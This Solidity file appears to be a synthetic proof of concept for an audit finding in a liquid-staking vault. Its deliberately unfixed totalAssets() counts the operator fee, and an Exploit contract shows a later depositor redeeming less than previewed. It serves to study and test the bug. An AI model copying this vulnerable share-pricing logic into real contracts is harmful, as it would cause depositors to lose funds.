// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Liquid Ron — [H-01] totalAssets() wrong when operatorFeeAmount > 0
    (Code4rena 2025-01-liquid-ron; #50051)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: totalAssets() returns vault balance + staked + rewards WITHOUT
    subtracting operatorFeeAmount. New depositors mint shares against an inflated
    asset base that includes the operator's claimable fee. When the operator later
    withdraws the fee, totalAssets drops and depositors redeem fewer assets than
    previewed — loss of funds for late withdrawers / new depositors.
    Vulnerable totalAssets formula preserved @>. */

contract LiquidRon {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint256 public operatorFeeAmount;
    address public operator;
    // Simulated external staked/rewards (0 in this reduction; fee sits in balance).
    uint256 public totalStaked;
    uint256 public totalRewards;

    constructor(address _operator) {
        operator = _operator;
    }

    receive() external payable {}

    /// @dev Vulnerable totalAssets — does NOT subtract operatorFeeAmount.
    function totalAssets() public view returns (uint256) {
        // @> VULN: operator fee is included in the asset base used for share pricing
        return address(this).balance + totalStaked + totalRewards;
        // FIX: return address(this).balance + totalStaked + totalRewards - operatorFeeAmount;
    }

    function deposit() external payable returns (uint256 shares) {
        uint256 assets = msg.value;
        uint256 ts = totalSupply;
        if (ts == 0) {
            shares = assets;
        } else {
            shares = (assets * ts) / totalAssets();
        }
        totalSupply += shares;
        balanceOf[msg.sender] += shares;
    }

    /// @dev Simulates harvest: converts rewards into WRON balance and accrues operator fee.
    function harvest(uint256 fee) external {
        // In the real system harvest pulls rewards into the vault and takes a fee cut.
        // Here the fee is already sitting in the contract balance; we just book it.
        require(msg.sender == operator, "op");
        operatorFeeAmount += fee;
    }

    function fetchOperatorFee() external {
        require(msg.sender == operator, "op");
        uint256 fee = operatorFeeAmount;
        operatorFeeAmount = 0;
        (bool ok,) = payable(operator).call{value: fee}("");
        require(ok, "fee send");
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        if (totalSupply == 0) return 0;
        return (shares * totalAssets()) / totalSupply;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        require(msg.sender == owner, "owner");
        require(balanceOf[owner] >= shares, "bal");
        assets = (shares * totalAssets()) / totalSupply;
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        (bool ok,) = payable(receiver).call{value: assets}("");
        require(ok, "send");
    }
}

contract User {
    LiquidRon public vault;

    constructor(LiquidRon v) {
        vault = v;
    }

    receive() external payable {}

    function doDeposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function doRedeem(uint256 shares) external {
        vault.redeem(shares, address(this), address(this));
    }
}

contract Operator {
    receive() external payable {}

    function doHarvest(LiquidRon v, uint256 fee) external {
        v.harvest(fee);
    }

    function doFetch(LiquidRon v) external {
        v.fetchOperatorFee();
    }
}

contract Exploit {
    Operator public op; // CREATE nonce 1
    LiquidRon public vault; // CREATE nonce 2 — vulnerable
    User public user1; // CREATE nonce 3 — early depositor
    User public user2; // CREATE nonce 4 — new depositor (victim)

    uint256 public expectedRedeem;
    uint256 public actualRedeem;
    uint256 public loss;

    constructor() {
        op = new Operator();
        vault = new LiquidRon(address(op));
        user1 = new User(vault);
        user2 = new User(vault);
    }

    function run() external payable {
        // Fund path: caller (EOA) sends ETH in; we forward to users.
        // Playground funds the attacker EOA; Exploit receives via setup or we use
        // address(this).balance if constructor was funded. Prefer pulling from msg.value
        // and from self balance for forge test.
        uint256 amount = 100 ether;

        // Ensure we have ETH: in forge, test will deal; in playground, setup funds exploit.
        require(address(this).balance >= amount * 2 + 10 ether, "need eth");

        // 1. user1 deposits 100 ether
        user1.doDeposit{value: amount}();
        require(vault.balanceOf(address(user1)) == amount, "u1 shares");

        // 2. Operator harvests: book 10 ether fee (fee already conceptually in vault —
        //    we also top-up vault so fee is physically withdrawable without stealing principal).
        //    Simpler scenario matching the report numbers:
        //    totalBalance includes fee sitting in the vault.
        //    Inject 10 ETH as "harvested rewards", then harvest books 10 as fee.
        (bool ok,) = payable(address(vault)).call{value: 10 ether}("");
        require(ok, "inject");
        op.doHarvest(vault, 10 ether);
        require(vault.operatorFeeAmount() == 10 ether, "fee booked");

        // totalAssets still includes the 10 ether fee (VULN)
        uint256 ta = vault.totalAssets();
        require(ta == 110 ether, "ta includes fee"); // 100 + 10

        // 3. user2 deposits 100 ether while fee is in totalAssets
        user2.doDeposit{value: amount}();
        uint256 user2Shares = vault.balanceOf(address(user2));
        // shares = 100 * 100 / 110 ≈ 90.909...
        expectedRedeem = vault.previewRedeem(user2Shares);
        // preview while fee still included

        // 4. Operator withdraws fee → totalAssets drops
        op.doFetch(vault);
        require(vault.operatorFeeAmount() == 0, "fee cleared");

        // 5. user2 redeems — receives less than previewed
        uint256 balBefore = address(user2).balance;
        user2.doRedeem(user2Shares);
        actualRedeem = address(user2).balance - balBefore;

        require(actualRedeem < expectedRedeem, "should receive less than preview");
        loss = expectedRedeem - actualRedeem;
        require(loss > 0, "loss demonstrated");
        // Harm: new depositor loses assets because totalAssets included operator fee.
    }

    receive() external payable {}
}
